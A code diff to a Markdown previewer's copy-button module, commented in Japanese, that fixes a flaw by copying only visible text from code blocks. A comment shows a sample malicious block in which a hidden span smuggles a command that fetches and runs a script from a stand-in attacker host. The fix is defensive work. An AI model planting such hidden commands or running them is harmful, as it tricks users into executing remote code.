@@ -37,12 +37,29 @@ import { t } from "./i18n.js";
  * 1 段挟んでも当たり方は変わらない。Mermaid は `<code>` を持たないので包まない
  * （`renderMermaid` の `els.preview.querySelectorAll("pre.mermaid")` もそのまま効く）。
  *
- * ## 中身は `code.textContent` から取る
+ * ## 中身は「画面に出ている文字」だけを取る
  *
- * ハイライト（`highlight.js` / `highlight.js` 由来の `<span class="hljs-*">`）が入っている
- * ので、`innerHTML` を渡すとタグごとクリップボードへ入る。`textContent` なら
- * **生テキストのまま**取れる。ボタン自身は `<pre>` 直下（`<code>` の外）へ置くので、
- * ボタンのラベルが中身に混ざることもない。
+ * ハイライト（`<span class="hljs-*">`）が入っているので `innerHTML` は使えない ——
+ * タグごとクリップボードに入る。かといって **`textContent` も使えない**:
+ * **`display: none` の子孫の文字まで拾う**からで、これは実害のある差になる。
+ *
+ * `src/renderer.ts` は raw HTML の `<pre>` をそのまま通し、サニタイザ
+ * （`public/sanitize-config.js`）が落とすのは `<style>` / `style` / `data-i18n*` だけなので、
+ * **`<span hidden>` はそのまま残る**（実測）。つまり悪意ある md が
+ *
+ * ```html
+ * <pre><code>curl https://good.example/i.sh | sh<span hidden>; curl http://evil.example|sh</span></code></pre>
+ * ```
+ *
+ * と書くと、**画面には安全なコマンドしか見えないのに、ボタン 1 つで別のコマンドが
+ * 混ざった文字列が端末へ貼られる**。#165 以前は手動の範囲選択しかなく、`display: none`
+ * は選択に含まれなかったので、**これはコピーボタンが新しく開ける経路**。悪意ある md を
+ * 脅威モデルに含めるのは #21 / #59 で確立済みの前提。
+ *
+ * そこで **描画されている部分だけを歩いて集める**（`visibleTextOf`）。
+ * `innerText` は使わない —— 空白と改行を正規化するので、コードには使えない。
+ *
+ * ボタン自身は `<pre>` の外に置くので、ラベルが中身へ混ざることもない。
  */
 /**
  * ボタンに付けるクラス。**見た目と、言語切替で拾い直すためだけに使う。**
@@ -50,10 +67,61 @@ import { t } from "./i18n.js";
  * **二重付与の判定には使わない** —— サニタイザが `<button class="…">` を通すので、
  * 利用者の Markdown で同じ class の要素を作れてしまう（下の `decorated` を参照）。
  */
-export const COPY_BUTTON_CLASS = "code-copy-btn";
+const COPY_BUTTON_CLASS = "code-copy-btn";
 
 /** ボタンを右上に留めるための包み。**スクロールしないのが役目**。 */
-export const CODE_BLOCK_CLASS = "code-block";
+const CODE_BLOCK_CLASS = "code-block";
+
+/**
+ * **画面に出ている文字だけ**を DOM 順で集める (Issue #165)。
+ *
+ * `textContent` は `display: none` の子孫まで拾うので、そのままでは
+ * **見えていない文字列をクリップボードへ入れられる**（上のクラスコメント）。
+ * 計算後のスタイルで隠れている部分木を飛ばす。
+ *
+ * **`aria-hidden` は見ない。** あれは支援技術から隠す宣言で、**画面には出ている** ——
+ * 落とすと装飾目的の文字が消えて、コピー結果が見た目と食い違う。
+ *
+ * **`getComputedStyle` はクリック時にしか呼ばない**ので、描画の速さには効かない。
+ *
+ * @param {HTMLElement} root
+ * @returns {string}
+ */
+export function visibleTextOf(root) {
+  const view = root.ownerDocument?.defaultView;
+  let out = "";
+  /** @param {ChildNode} node */
+  const walk = (node) => {
+    if (node.nodeType === 3 /* TEXT_NODE */) {
+      out += node.nodeValue ?? "";
+      return;
+    }
+    if (node.nodeType !== 1 /* ELEMENT_NODE */) return;
+    const el = /** @type {HTMLElement} */ (/** @type {unknown} */ (node));
+    // **`getComputedStyle` が使えない環境では素通しする**（隠れていないものとして扱う）
+    const style = view?.getComputedStyle?.(el);
+    if (style && (style.display === "none" || style.visibility === "hidden")) return;
+    for (const child of el.childNodes) walk(child);
+  };
+  for (const child of root.childNodes) walk(child);
+  return out;
+}
+
+/**
+ * `<code class="language-js">` から言語 ID を取る。取れなければ `null`。
+ *
+ * **形を確かめてから使う。** 値の素性はサーバの allowlist（`src/util/text-ext.ts`）や
+ * `marked` 由来で確かだが、**読み上げ名として画面へ出す**ので、
+ * `app-preview.js` の `isSafeLanguageId` と同じ形の検査を掛ける。
+ *
+ * @param {HTMLElement | null} code
+ * @returns {string | null}
+ */
+export function languageOf(code) {
+  const cls = [...(code?.classList ?? [])].find((c) => c.startsWith("language-"));
+  const lang = cls?.slice("language-".length);
+  return lang && /^[a-z0-9+#-]{1,32}$/.test(lang) ? lang : null;
+}
 
 /**
  * コピー対象のコードブロックを DOM 順で返す。
@@ -64,7 +132,7 @@ export const CODE_BLOCK_CLASS = "code-block";
  * @param {ParentNode} root
  * @returns {HTMLElement[]}
  */
-export function copyableCodeBlocks(root) {
+function copyableCodeBlocks(root) {
   return /** @type {HTMLElement[]} */ (Array.from(root.querySelectorAll("pre > code")));
 }
 
@@ -92,9 +160,42 @@ export function createCodeCopy(ctx) {
    * `WeakSet` なので、再描画で `<pre>` ごと捨てられれば自動的に消える
    * （＝新しい `<pre>` には改めて付く）。
    *
-   * @type {WeakSet<HTMLElement>}
+   * @type {WeakMap<HTMLElement, HTMLElement>}
    */
-  const decorated = new WeakSet();
+  const decorated = new WeakMap();
+
+  /**
+   * **自分が作ったボタン。** `refresh()` はここからしか辿らない。
+   *
+   * `querySelectorAll(".code-copy-btn")` で拾うと、**利用者の md が同じ class を
+   * 名乗った要素にも正規の i18n 文言を書き込む** —— `sanitize-config.js` が
+   * `data-i18n*` を `FORBID_ATTR` に入れている理由（「i18n 機構がユーザーコンテンツへ
+   * 漏れないようにする」）と同じ漏れが、経路を `class` に変えて再発する。
+   *
+   * **配列で持つ。** プレビューは丸ごと作り直されるので、`decorate()` の先頭で捨てる。
+   *
+   * @type {HTMLElement[]}
+   */
+  let ownButtons = [];
+
+  /**
+   * ボタンの読み上げ名とツールチップを当てる。
+   *
+   * **言語が分かるなら名前に混ぜる。** 混ぜないと、スクリーンリーダーのボタン一覧に
+   * 「このコードブロックをコピー」が同名で並び、**どのブロックか区別できない**。
+   * 言語は `<code class="language-js">` から取る（サーバの allowlist 由来なので
+   * 素性は確かだが、**表示に使うので形も見る**）。
+   *
+   * @param {HTMLElement} button
+   * @param {HTMLElement | null} code
+   * @returns {void}
+   */
+  function applyLabels(button, code) {
+    const lang = languageOf(code);
+    const label = lang ? t("code.copy.aria.lang", { lang }) : t("code.copy.aria");
+    button.setAttribute("aria-label", label);
+    button.title = t("code.copy.title");
+  }
 
   /**
    * 押した手応えを出す。**`app-document.js` の `flashCopied` と同じ見せ方**
@@ -126,9 +227,9 @@ export function createCodeCopy(ctx) {
       // **`ctx.document` のものを使う。** `navigator.clipboard` が使えない
       // 非セキュアコンテキスト（`--share` で LAN から HTTP で開いたとき）の
       // フォールバックを既に持っているので、ここで書き直さない
-      await ctx.document.copyTextToClipboard(code.textContent ?? "");
+      await ctx.document.copyTextToClipboard(visibleTextOf(code));
       flash(button);
-      ctx.setStatus("ok", t("code.copied"));
+      ctx.setStatus("ok", t("status.codeCopied"));
     } catch (err) {
       ctx.setStatus("error", t("status.copyFailed", { msg: messageOf(err) }));
     }
@@ -145,11 +246,12 @@ export function createCodeCopy(ctx) {
    * @returns {void}
    */
   function decorate() {
+    // **DOM から外れたボタンを持ち回らない。** 再描画で前回のボタンは捨てられている
+    ownButtons = ownButtons.filter((b) => b.isConnected);
     for (const code of copyableCodeBlocks(els.preview)) {
       const pre = code.parentElement;
       if (!pre) continue;
       if (decorated.has(pre)) continue;
-      decorated.add(pre);
 
       // **スクロールしない包みを挟む**（上の「ボタンは `<pre>` の外に置く」）。
       // `replaceWith` → `appendChild` の順にすると、`<pre>` は文書内の同じ位置に残る
@@ -163,13 +265,19 @@ export function createCodeCopy(ctx) {
       button.className = COPY_BUTTON_CLASS;
       // **`data-i18n` は使えない。** `applyI18n` は静的 DOM を対象にしており、
       // ここは描画のたびに作り直されるので、言語切替時は `refresh` が呼び直す
-      button.setAttribute("aria-label", t("code.copy.aria"));
-      button.title = t("code.copy.title");
+      applyLabels(button, code);
       // **アイコンは装飾。** 読み上げ名は `aria-label` が持つので「⧉」とは言われない
       button.textContent = "⧉";
-      button.addEventListener("click", () => {
+      button.addEventListener("click", (ev) => {
+        // **伝播を止める。** `app-document.js` はプレビューの click を委譲で受けて
+        // `closest("a")` を引くので、`<a>` の中に書かれたコードブロックだと
+        // コピーと同時に外部リンクバナー / 遷移まで走る
+        ev.preventDefault();
+        ev.stopPropagation();
         void copyBlock(code, button);
       });
+      decorated.set(pre, button);
+      ownButtons.push(button);
       // **`<pre>` の外（包みの直下）へ置く。** 中に入れると (1) ラベルが
       // `code.textContent` に混ざって中身が汚れ、(2) 横スクロールで流れる
       wrap.appendChild(button);
@@ -182,10 +290,11 @@ export function createCodeCopy(ctx) {
    * @returns {void}
    */
   function refresh() {
-    for (const el of els.preview.querySelectorAll(`.${COPY_BUTTON_CLASS}`)) {
-      const button = /** @type {HTMLElement} */ (el);
-      button.setAttribute("aria-label", t("code.copy.aria"));
-      button.title = t("code.copy.title");
+    // **自分が作ったものだけ**（利用者の md が名乗った同名 class は触らない）
+    for (const button of ownButtons) {
+      if (!button.isConnected) continue;
+      const code = button.parentElement?.querySelector("pre > code");
+      applyLabels(button, /** @type {HTMLElement | null} */ (code));
     }
   }
 
